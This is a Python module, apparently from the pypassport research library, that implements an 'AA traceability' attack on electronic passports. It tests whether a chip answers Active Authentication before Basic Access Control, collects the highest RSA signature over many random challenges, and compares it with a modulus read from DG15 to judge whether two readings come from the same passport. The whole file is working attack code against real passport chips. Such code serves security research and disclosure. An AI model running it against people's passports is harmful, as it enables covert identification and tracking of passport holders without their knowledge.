import logging
import os

from Crypto.PublicKey import RSA

from pypassport.attacks.sign_everything import SignEverything
from pypassport.doc9303 import bac
from pypassport.iso7816 import ISO7816, ISO7816Exception
from pypassport.utils import to_hex_string


class AATraceabilityException(Exception):
    pass


class AATraceability:
    """
    Identify a passport through a misuse of Active Authentication (AA).

    On some passports AA can be run *before* BAC, yielding a signature without
    any access control. In RSA, a signature is always smaller than the modulus,
    so by signing random challenges and keeping the highest value seen we get a
    lower bound that creeps towards the (unique) modulus. Comparing that bound
    with a known modulus (read from DG15) tells us whether a given passport
    could be the one that produced the signatures: if the highest signature
    exceeds a candidate modulus, the two cannot belong to the same passport.
    """

    def __init__(self, iso7816):
        self._iso7816 = iso7816

        if not isinstance(self._iso7816, ISO7816):
            raise AATraceabilityException("The sublayer iso7816 is not available")

        self._iso7816.rst_connection()
        self._bac = None

    def is_vulnerable(self):
        """
        Check whether Internal Authentication can be run BEFORE a BAC.

        @return: True if the passport answers Internal Authentication without
            access control, False otherwise.
        """
        self._iso7816.rst_connection()
        try:
            rnd = to_hex_string(list(os.urandom(8)))
            logging.info("Trying to execute an internal authentication before BAC")
            if self._iso7816.internal_authentication(rnd):
                return True
        except ISO7816Exception:
            pass
        return False

    def get_highest_sign(self, count=100):
        """
        Sign C{count} random challenges and keep the highest signature seen.

        The more iterations, the tighter the lower bound on the modulus.

        @param count: Number of Internal Authentication rounds.
        @type count: int
        @return: The highest signature as a lowercase hex string.
        """
        if not self.is_vulnerable():
            raise AATraceabilityException("This passport is not vulnerable to AA traceability")

        highest = 0
        logging.info("Starting the internal authentication loop (%d rounds)", count)
        for _ in range(count):
            try:
                rnd = to_hex_string(list(os.urandom(8)))
                signature = int.from_bytes(self._iso7816.internal_authentication(rnd), "big")
                if signature > highest:
                    highest = signature
            except ISO7816Exception as msg:
                logging.debug("Internal authentication failed: %s", msg)

        return "%x" % highest

    def get_modulo(self, mrz_value):
        """
        Read DG15 (after BAC) and return the RSA modulus of the AA public key.

        @param mrz_value: A MRZ string.
        @type mrz_value: String
        @return: The modulus as a lowercase hex string.
        """
        spki_der = self._get_pub_key(mrz_value)
        modulus = RSA.import_key(spki_der).n
        modulus_hex = "%x" % modulus
        logging.info("Modulus: %s", modulus_hex)
        return modulus_hex

    def _get_pub_key(self, mrz_value):
        """Read the DG15 public key (DER SubjectPublicKeyInfo) via SignEverything."""
        self._bac = bac.BAC(self._iso7816)
        return SignEverything(self._iso7816).get_pub_key(self._bac, mrz_value)

    @staticmethod
    def compare(modulo, highest):
        """
        Relative gap between a modulus and a signature, in percent.

        A small gap means the highest signature is close to that modulus, i.e.
        the passport is plausibly the one the modulus belongs to.

        @param modulo: Modulus as a hex string.
        @param highest: Highest signature as a hex string.
        @return: (modulo - highest) / modulo as a percentage (float).
        """
        modulo = int(modulo, 16)
        highest = int(highest, 16)
        return (1.0 * (modulo - highest) / modulo) * 100

    @staticmethod
    def may_belong_to(modulo, highest):
        """
        Decide whether a signature could come from the passport owning C{modulo}.

        A signature can never exceed its own modulus, so if C{highest} is larger
        than C{modulo} the two cannot belong to the same passport.

        @param modulo: Modulus as a hex string.
        @param highest: Highest signature as a hex string.
        @return: True if they may belong to the same passport, else False.
        """
        if int(highest, 16) > int(modulo, 16):
            logging.info("The signature is higher than the modulus: different passport")
            return False
        return True
